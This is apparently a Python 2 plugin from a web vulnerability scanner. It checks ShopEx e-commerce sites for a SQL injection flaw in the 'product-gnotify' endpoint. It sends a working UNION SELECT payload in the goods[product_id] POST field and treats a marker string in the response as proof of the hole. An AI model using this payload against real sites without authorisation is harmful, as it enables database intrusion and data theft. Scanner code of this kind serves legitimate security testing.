#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"?product-gnotify")
        
        data="goods%5Bgoods_id%5D=3&goods%5Bproduct_id%5D=1+and+1%3D2+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2Cconcat%280x245E%2C1%2C0x2D3E%2C2%2C0x5E24%2C0x4E56535F544553545F474F%29%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22&url="+url
        headers={"Host": domain,"User-Agent": "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3","Accept-Encoding": "gzip, deflate","Connection": "keep-alive","Content-Type": "application/x-www-form-urlencoded"}

        #res, content = http.request(expurl,"POST",data,headers)
        res, content = yx_httplib2_request(http,expurl,"POST",data,headers)
        print content
        if res['status'] == '200' and content.find('NVS_TEST_GO')>=0:
            #print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
            request = postRequest(expurl,"POST",headers,data)
            response = getResponse(res)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:shopexpostsqlinjectionscript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:shopexpostsqlinjectionscript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def